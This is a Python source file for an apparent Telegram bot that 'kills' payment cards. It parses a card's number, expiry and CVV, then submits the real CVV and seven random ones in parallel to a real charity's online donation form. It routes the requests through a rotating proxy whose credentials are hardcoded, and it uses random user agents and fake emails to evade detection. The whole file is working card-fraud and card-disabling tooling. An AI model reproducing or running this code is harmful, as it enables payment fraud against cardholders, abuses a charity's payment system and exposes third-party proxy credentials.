import requests
import re
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
]
proxy_base = 'p.webshare.io:80'

proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def generate_random_email() -> str:
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(('gmail.com', 'yahoo.com', 'outlook.com'))
    return f"{username}@{domain}"

# ----------------------------------------------------------------------
# ★ FIXED: UNIVERSAL CARD PARSER
# ----------------------------------------------------------------------
def parse_card_input(raw: str) -> str:
    """
    Parses card from ANY format:
    - 4701320081651941 Expired : 06/29 Cvv : 091
    - multiline
    - mixed labels
    Returns: cc|mm|yy|cvv
    """
    text = raw.lower().replace("\n", " ").replace("\r", " ")
    text = re.sub(r'\s+', ' ', text)

    # 1) Card number
    card = re.search(r'\b\d{13,19}\b', text)
    if not card:
        raise ValueError("Card number not found")
    cc = card.group(0)

    # 2) Expiry
    expiry = re.search(r'\b(0[1-9]|1[0-2])\s*[/\-]\s*(\d{2}|\d{4})\b', text)
    if not expiry:
        raise ValueError("Expiry month/year not parsed")

    mm = expiry.group(1)
    yy = expiry.group(2)[-2:]  # convert YYYY → YY

    # 3) CVV
    cvv = None

    labeled = re.search(r'(cvv|cvc|cvn)[^\d]{0,10}(\d{3,4})', text)
    if labeled:
        cvv = labeled.group(2)
    else:
        for digits in re.findall(r'\b\d{3,4}\b', text):
            if digits != yy and digits != mm and digits not in cc:
                cvv = digits
                break

    if not cvv:
        raise ValueError("CVV not parsed")

    return f"{cc}|{mm}|{yy}|{cvv}"

# ----------------------------------------------------------------------
# ★ FIXED: Return cookies properly
# ----------------------------------------------------------------------
def get_fresh_cookies(proxy: dict) -> dict:
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'user-agent': get_random_user_agent(),
        }
        response = requests.get(
            'https://aasr-indy.org/philanthropy/donate/',
            headers=headers,
            proxies=proxy,
            timeout=5
        )
        return response.cookies.get_dict()   # <-- FIXED
    except Exception as e:
        logger.error(f"Failed to fetch cookies: {str(e)}")
        return {}

# ----------------------------------------------------------------------
def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    cc, mm, yy, _ = card_info.split('|')

    with requests.Session() as session:
        cookies = get_fresh_cookies(proxy)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': get_random_user_agent(),
        }

        data = {
            'amount': '20',
            'direct_to': 'Cathedral Foundation',
            'type': 'General',
            'memory_of': 'Elizabeth Queen',
            'credit_card': 'Visa',
            'credit_card_number': cc,
            'expiration_month': mm,
            'expiration_year': f"20{yy}",
            'cvv': cvv,
            'billing_first_name': 'Mohammed',
            'billing_last_name': 'Nehal',
            'billing_address': 'New York',
            'billing_city': 'New York',
            'billing_state': 'New York',
            'billing_postal_code': '10040',
            'billing_country': 'United States',
            'billing_telephone': '07975102052',
            'billing_email': generate_random_email(),
            'submit': '1',
            'debug': '1',
        }

        try:
            response = session.post(
                'https://aasr-indy.org/philanthropy/donate/',
                headers=headers,
                data=data,
                cookies=cookies,
                proxies=proxy,
                timeout=5
            )

            match = re.search(r'<p\s+class="attention">\s*(.*?)\s*</p>', response.text)
            msg = match.group(1) if match else "No message"

            logger.info(f"CVV {cvv}: {msg}")
            return f"{cvv} - {msg}"

        except Exception as e:
            logger.error(f"Error for CVV {cvv}: {str(e)}")
            return f"{cvv} - Error: {str(e)}"

# ----------------------------------------------------------------------
async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    try:
        normalized = parse_card_input(card_info)
    except ValueError as e:
        await event.reply(f"❌ Error: {str(e)}\nSend full card, expiry and cvv in any format.")
        return

    cc, mm, yy, real_cvv = normalized.split('|')

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()

    cvvs = [real_cvv] + [f"{random.randint(0,999):03d}" for _ in range(7)]

    with ThreadPoolExecutor(max_workers=8) as executor:
        proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
        results = list(
            executor.map(
                lambda c, p: process_cvv(normalized, c, p),
                cvvs,
                proxy_cycle[:len(cvvs)]
            )
        )

    total_time = time.time() - start_time

    msg = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"

    for r in results:
        msg += r + "\n"

    msg += f"\n⏱ Time Taken: {total_time:.2f}s"

    await processing_msg.edit(msg)
